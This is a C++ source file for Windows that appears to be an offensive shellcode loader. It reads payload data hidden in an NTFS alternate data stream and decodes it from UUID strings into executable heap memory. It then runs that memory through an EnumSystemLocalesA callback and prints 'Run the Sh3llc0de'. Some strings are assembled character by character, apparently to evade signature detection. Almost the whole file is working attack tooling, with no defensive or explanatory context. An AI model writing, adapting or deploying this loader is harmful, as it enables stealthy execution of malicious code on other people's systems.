#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <vector>
#include <Rpc.h>
#pragma comment(lib, "Rpcrt4.lib")

using namespace std;

char* ADSread(char* ADSpath) {
	char EnvSys[] = { 'S','y','s','t','e','m','D','r','i','v','e',0 };
	char sysDrive[MAX_PATH];
	if (!GetEnvironmentVariableA(EnvSys, sysDrive, MAX_PATH)) {
		printf("Failed in retrieving SystemDrive ENV variable (%u)\n", GetLastError());
		return NULL;
	}
	lstrcatA(sysDrive, "\\\\");

	char FileSystemNameBuffer[1024];
	if (!GetVolumeInformationA(sysDrive, NULL, NULL, NULL, NULL, NULL, FileSystemNameBuffer, 1024)) {
		printf("Failed in GetVolumeInformationA (%u)\n", GetLastError());
		return FALSE;
	}
	char ntfs[] = { 'N','T','F','S',0 };
	if (!strcmp(ntfs, FileSystemNameBuffer)) {
		HANDLE hFile = CreateFileA(ADSpath, GENERIC_READ | GENERIC_WRITE | FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (!hFile) {
			printf("Failed in CreateFileA (%u)\n", GetLastError());
			return NULL;
		}

		char dataRead[1024];
		DWORD bytesRead;

		SetFilePointer(hFile, NULL, NULL, FILE_BEGIN);
		ReadFile(hFile, dataRead, sizeof(dataRead), &bytesRead, NULL);
		//printf("dataRead \n%s\n\n\n", dataRead);
		return dataRead;
	}
}


int main(int argc, char** argv) {
	char* ADSpath = argv[1];
	char* ADSdata = NULL;
	printf("[+] Read bytes array data from the ADS\n");
	ADSdata = ADSread(ADSpath);

	//printf("ADSdata  :\n%s\n\n\n", ADSdata);
	printf("[+] Parse data to UUIDs char table\n");
	const char* uuids[100];
	int count = 0;
	memset(uuids, '\0', sizeof(uuids));
	uuids[count++] = ADSdata;

	char* ptr = ADSdata;
	while (*ptr) { 
		if (*ptr == '*') {
			*ptr = 0;
			uuids[count++] = ptr + 1;
		}
		
		ptr++;
	}
	printf("[+] the string UUID shellcode :\n\n");
	for (int i = 0; i < 18; i++) {
		printf("%s\n", uuids[i]);
	}
	printf("\n");
	printf("[+] Allocate a block of memory from the heap\n");
	HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
	void* hmem = HeapAlloc(hHeap, 0, 0x1000);
	DWORD_PTR ptr_ = (DWORD_PTR)hmem;
	int init = sizeof(uuids) / sizeof(uuids[0]);
	printf("[+] Convert a string to a UUID.\n");
	for (int i = 0; i < init; i++) {
		RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)ptr_);
		if (status != RPC_S_OK) {
			printf("UuidFromStringA != RPC_S_OK\n");
			CloseHandle(hmem);
			return -1;
		}
		ptr_ += 16;
	}

	printf("[+] Run the Sh3llc0de\n");
	EnumSystemLocalesA((LOCALE_ENUMPROCA)hmem, 0);
	CloseHandle(hmem);	
	
	return 0;


}